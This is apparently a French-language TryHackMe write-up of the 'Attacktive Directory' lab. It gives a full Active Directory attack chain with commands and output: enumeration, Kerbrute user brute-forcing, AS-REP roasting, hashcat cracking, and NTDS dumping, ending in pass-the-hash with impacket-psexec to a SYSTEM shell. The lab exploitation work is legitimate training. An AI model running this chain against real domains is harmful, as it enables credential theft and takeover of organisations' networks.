---
title: Attacktive Directory - TryHackMe
date: 2024-02-26 00:00:00 -500
categories: [TryHackMe]
tags: [AD, THM, Easy, Hacking]
image:
    path: https://i.ibb.co/Y7hwSFK/tryhackme.png
---

Hi, aujourd'hui je vais partager mes notes avec la Box `AttacktiveDirectory` sur TryHackMe, qui m'a donne plein de connaissance de bases dans l'exploitation d'un Active Directory.


- **The Best Academy to Learn Hacking is [Here](https://affiliate.hackthebox.com/nenandjabhata)**.
- **Beginner Friendly challenges on TryHackMe [Here](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconnaissance
Comme tout autre machine, je vais commencer par scanner la Box avec `nmap` et ce petit outil automatiser disponible ici : [nmapauto](https://github.com/nenandjabhata/CTFs-Journey/blob/main/Scripts/nmapauto.sh).

```terminal
└─# /home/blo/tools/nmapautomate/nmapauto.sh 10.10.222.17 

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 16:54 CST
Initiating Ping Scan at 16:54
Scanning 10.10.222.17 [4 ports]
Completed Ping Scan at 16:54, 0.75s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:54
Completed Parallel DNS resolution of 1 host. at 16:54, 0.08s elapsed
Initiating SYN Stealth Scan at 16:54
Scanning 10.10.222.17 [1000 ports]
Discovered open port 139/tcp on 10.10.222.17
Discovered open port 135/tcp on 10.10.222.17
Discovered open port 445/tcp on 10.10.222.17
Discovered open port 53/tcp on 10.10.222.17
Discovered open port 80/tcp on 10.10.222.17
Discovered open port 3389/tcp on 10.10.222.17
Discovered open port 636/tcp on 10.10.222.17
Discovered open port 593/tcp on 10.10.222.17
Discovered open port 88/tcp on 10.10.222.17
Discovered open port 3269/tcp on 10.10.222.17
Discovered open port 3268/tcp on 10.10.222.17

Completed SYN Stealth Scan at 16:55, 22.31s elapsed (1000 total ports)
Nmap scan report for 10.10.222.17
Host is up (1.0s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

----------------------------------------------------------------------------------------------------------
Open Ports : 53,80,88,135,139,389,445,464,593,636,3268,3269,3389                                                                                             
----------------------------------------------------------------------------------------------------------  

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 16:55 CST
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 16:55
Completed Parallel DNS resolution of 1 host. at 16:55, 0.00s elapsed
Initiating SYN Stealth Scan at 16:55
Scanning 10.10.222.17 [65535 ports]
Discovered open port 445/tcp on 10.10.222.17
Discovered open port 53/tcp on 10.10.222.17
Discovered open port 80/tcp on 10.10.222.17
Discovered open port 135/tcp on 10.10.222.17
Discovered open port 3389/tcp on 10.10.222.17
Discovered open port 139/tcp on 10.10.222.17
Initiating NSE at 16:57
Completed NSE at 16:57, 5.01s elapsed
Nmap scan report for 10.10.222.17
Host is up (7.9s latency).
Not shown: 64876 filtered tcp ports (no-response), 653 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
53/tcp   open  tcpwrapped
80/tcp   open  tcpwrapped
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
445/tcp  open  tcpwrapped
3389/tcp open  tcpwrapped

----------------------------------------------------------------------------------------------------------
Open Ports : 53,80,135,139,445,3389                                                                                         
```
**Second Scan**
- Je vais faire un second scan sur les ports ouverts dans la Box dans le but de trouver leurs versions et aussi certains informations necessaire pour mon Pentest.

```terminal
└─# nmap -sV -sC -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389  10.10.222.17
NSE Timing: About 94.23% done; ETC: 17:06 (0:00:00 remaining)
Nmap scan report for 10.10.222.17
Host is up (0.76s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-26 23:05:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2024-02-25T22:47:59
|_Not valid after:  2024-08-26T22:47:59
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-26T23:06:23+00:00
|_ssl-date: 2024-02-26T23:06:34+00:00; 0s from scanner time.
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-26T23:06:25
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required


```

Ici d'apres mon scan, voici quelque infos :
- Le Domain : `spookysec.local`
- Le Domain Controller : `ATTACKTIVEDIREC.spookysec.local`
- MSRPC disponible au port `135`
- SMB disponible aux ports `139 & 445`
- LDAP disponible aux ports `389 & 3268`
- Un site web disponible au port `80`
- Le Kerberoas ouvert au port `88`

Comme le Kerberos et LDAP  sont ouvert, nous avons une chance d'etre dans un Active Directory

```terminal
└─# host=spookysec.local                                           
                                                                                                                                                             
┌──(root㉿xXxX)-[/home/blo/CTFs/Boot2root/TryHackMe]
└─# host2=ATTACKTIVEDIREC.spookysec.local
─# echo "$ip  $host $host2" | tee -a /etc/hosts 
10.10.222.17  spookysec.local ATTACKTIVEDIREC.spookysec.local
```

En visitant le site au port `80`, je trouve que c'est juste un `IIS Windows Server` par defaut qui es installer.

![IIS](https://i.ibb.co/p0WmCnb/IIs.png)

**SMB**
Je vais enumerer le SMB avec `Netexec` pour voir si je vais avoir plus d'informations qui me donnerons l'acces initial a la Machine.

- **Acces Anonyme**
```terminal
─# nxc smb 10.10.222.17 -u '' -p ''                   
SMB         10.10.222.17    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.222.17    445    ATTACKTIVEDIREC  [+] spookysec.local\: 

```
On a un acces anonyme au SMB, essayons voir s'il peux enumerer les `shares`
```terminal
└─# nxc smb 10.10.222.17 -u '' -p '' --shares
SMB         10.10.222.17    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.222.17    445    ATTACKTIVEDIREC  [+] spookysec.local\: 
SMB         10.10.222.17    445    ATTACKTIVEDIREC  [-] Error enumerating shares: STATUS_ACCESS_DENIED

```
No Dommage, Pas possible d'enumerer les `shares` avec cet utilisateur

- **Acces Anonyme MSRPC**
J'ai  un utilisateur anonyme, essayons d'acceder au `MSRPC` grace a `rpcclient` pour enumerer d'autres utilisateurs dans le domaine
```terminal
└─# rpcclient -N -U '' $ip 
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```
ici aussi ca ne marche pas pour enumerer les utilisateurs.

**Brute-Force Kerberoas**
Maintenant que j'ai pas pu avoir des utilisateurs grace aux acces anonyme des protocoles `SMB` et `MSRPC`, alors je vais bruteforcer les utilisateurs Kerberoas grace a l'outil `Kerbrute` ensuite essayer de faire du `ASREPRoasting`

![Kerbrute](https://i.ibb.co/3sDzXyb/ker.png)

### ASREPRoasting
Comme j'ai des utilisateurs valides maintenant je vais essayer de faire du ASREPRoasting pour voir quel utilisateur n'a pas l'attribut kerberoas de pre-authentification requise.
- Pour cela je vais utiliser un outil dans la section de impacket qui est le `impacket-GetNPUsers`

```terminal

─# impacket-GetNPUsers spookysec.local/ -no-pass -usersfile kerb_user.txt -dc-ip 10.10.237.76
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[-] User Muirland doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User optional doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User breakerofthings doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sherlocksec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-spooks doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:bd5c6668ca5c22bd48430125cdd0fba4$47ba2f653f4ef02f45f871fc3837edb00a3d67ca5794c7ab47fcd408516cf4c69bc7204721e9445a23d7fdd8c4057c4d941f8130e4432620be7296f6e4ef761cd70a73f3bd10bbdbb717481a82dbc44f39cfcbd055ace196bda45925b9c6e90f59fd35d94fc44ab7b76e01afcb5f953bc5e6d6092cdf34f496796485a0100e568b81b6ceef27f5fcf99f1262147de728cc34e19328b2deaa0a71aa59f87134ed3816ced7da6b45fb4b6e730be4b446542f5a37c38a50751ba75a78ce1a1eb8ae892db2eeb032a93aae0f5505d5a8538bcd8f039032265e5b3a9daebd4b143986144224388c9754fe1aea2b097f7e9631ee03
```
J'arrive a avoir le Ticket `TGS` de l'utilisateur `svc-admin`

**Cracking**

```terminal
└─# hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2868/5800 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344387
* Bytes.....: 139921519
* Keyspace..: 14344387

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:bd5c6668ca5c22bd48430125cdd0fba4$47ba2f653f4ef02f45f871fc3837edb00a3d67ca5794c7ab47fcd408516cf4c69bc7204721e9445a23d7fdd8c4057c4d941f8130e4432620be7296f6e4ef761cd70a73f3bd10bbdbb717481a82dbc44f39cfcbd055ace196bda45925b9c6e90f59fd35d94fc44ab7b76e01afcb5f953bc5e6d6092cdf34f496796485a0100e568b81b6ceef27f5fcf99f1262147de728cc34e19328b2deaa0a71aa59f87134ed3816ced7da6b45fb4b6e730be4b446542f5a37c38a50751ba75a78ce1a1eb8ae892db2eeb032a93aae0f5505d5a8538bcd8f039032265e5b3a9daebd4b143986144224388c9754fe1aea2b097f7e9631ee03:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:bd5c6668ca5...31ee03
Time.Started.....: Mon Feb 26 17:59:37 2024 (2 secs)
Time.Estimated...: Mon Feb 26 17:59:39 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2138.5 kH/s (1.24ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5840896/14344387 (40.72%)
Rejected.........: 0/5840896 (0.00%)
Restore.Point....: 5836800/14344387 (40.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: manaiah11 -> mamitarica2205
Hardware.Mon.#1..: Temp: 40c Util: 63%
```
Avec `hashcat` je crack le hash et le mot de passe `management2005`

## Acces Initial

J'ai un utilisateur et un mot de passe, so maintenant quoi faire ?
- D'abord faire du `Netexec` pour voir s'ils sont valides.

```terminal
└─# nxc smb $ip -u svc-admin -p 'management2005'
SMB         10.10.237.76    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.237.76    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005

```

Ok l'utilisateur est bien valide,
- je vais enumerer le port 5985 basee sur `winrm` et voir si je peux me connecer

```terminal
─# nc -nv $ip 5985                             
(UNKNOWN) [10.10.237.76] 5985 (?) open

```

Le port est ouvert, alors je vais essayer de me connecter la dessus avec `evil-winrm`


```terminal
└─# evil-winrm -i $ip -u svc-admin -p management2005
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```
J'arrive pas a me connecter, Donc quoi faire encore ?
- Je vais enumerer les `shares` avec cet utilisateur


```terminal
└─# nxc smb $ip -u svc-admin -p 'management2005' --shares
SMB         10.10.237.76    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.237.76    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 
SMB         10.10.237.76    445    ATTACKTIVEDIREC  [*] Enumerated shares
SMB         10.10.237.76    445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.237.76    445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.237.76    445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.237.76    445    ATTACKTIVEDIREC  backup          READ            
SMB         10.10.237.76    445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.237.76    445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.237.76    445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share 
SMB         10.10.237.76    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share 
```

Plein de `shares` disponible et j'ai des droit de `READ` dans plein d'entre eux. et ici d'apres Google, l'un des plus importants `shares` ici est le `SYSVOL`. Donc essayons voir


```terminal
─# impacket-smbclient spookysec.local/svc-admin:management2005@10.10.237.76
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
Type help for list of commands
# shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
# use SYSVOL
# ls
drw-rw-rw-          0  Sat Apr  4 13:39:35 2020 .
drw-rw-rw-          0  Sat Apr  4 13:39:35 2020 ..
drw-rw-rw-          0  Sat Apr  4 13:39:35 2020 spookysec.local
# cd spookysec.local
# ls
drw-rw-rw-          0  Sat Apr  4 13:40:55 2020 .
drw-rw-rw-          0  Sat Apr  4 13:40:55 2020 ..
drw-rw-rw-          0  Mon Feb 26 17:54:50 2024 DfsrPrivate
drw-rw-rw-          0  Sat Apr  4 13:39:35 2020 Policies
drw-rw-rw-          0  Sat Apr  4 13:39:35 2020 scripts

```

Pour telecharger les fichiers en local

```terminal
─# smbclient \\\\10.10.237.76/SYSVOL -U svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 13:39:25 2020
  ..                                  D        0  Sat Apr  4 13:39:25 2020
  spookysec.local                    Dr        0  Sat Apr  4 13:39:25 2020

                8247551 blocks of size 4096. 3580186 blocks available
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \spookysec.local\DfsrPrivate\*
getting file \spookysec.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as spookysec.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \spookysec.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as spookysec.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \spookysec.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as spookysec.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (0.9 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```
J'y trouve rien la dessus,  je vais alors voir le `backup`

```terminal
# smbclient \\\\10.10.237.76/backup -U svc-admin%management2005
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 14:08:39 2020
  ..                                  D        0  Sat Apr  4 14:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 14:08:53 2020
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
```
Je telecharge le fichier et a l'interieur je troue un `base64` que je peux decoder dans mon terminal


```terminal
─# cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860 
```
Un autre utilisateur et un mot de passe, 
- Verification avec `Netexec`


```terminal
└─# nxc smb $ip -u backup -p 'backup2517860' --shares
SMB         10.10.237.76    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.237.76    445    ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860 
SMB         10.10.237.76    445    ATTACKTIVEDIREC  [*] Enumerated shares
SMB         10.10.237.76    445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.237.76    445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.237.76    445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.237.76    445    ATTACKTIVEDIREC  backup                          
SMB         10.10.237.76    445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.237.76    445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.237.76    445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share 
SMB         10.10.237.76    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share 

```

- Je vais essayer `wmiexec`  pour cet utilisateur.


```terminal
└─# impacket-wmiexec spookysec.local/backup:backup2517860@10.10.237.76
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

Encore `psexec`

```terminal
└─# impacket-psexec spookysec.local/backup:backup2517860@10.10.237.76
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Requesting shares on 10.10.237.76.....
[-] share 'ADMIN$' is not writable.
[-] share 'backup' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
```

## Privilege Escalation
On dispose d'un compte `backup`, qui s'agit du compte de sauvegarde du controlleur de domaine. Avec ce compte on a plusieurs privilege, notamment considerer comme un administrateur du Domaine. C'est a dire qu'on peux dump la base de donnees `SAM/NTDS` qui contient des hashes de connexion de tout les utilisateurs
- Pour cela je vais utiliser `impacket-secretsdump` pour extraire ces donnees et ensuite me connecter grace aux `Pass-the-Hash`

![Hash](https://i.ibb.co/vjBm3C6/hash.png)

### Pass-The-Hash
```terminal
└─# impacket-psexec spookysec.local/Administrator@10.10.186.88 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Requesting shares on 10.10.186.88.....
[*] Found writable share ADMIN$
[*] Uploading file USvDLBYT.exe
[*] Opening SVCManager on 10.10.186.88.....
[*] Creating service hHMi on 10.10.186.88.....
[*] Starting service hHMi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```


Thanks for reading.
### Join Us
**Let's learn, explore, and hack together**. **Join us on Discord [here](https://discord.gg/wBT9wr9ruG)**. 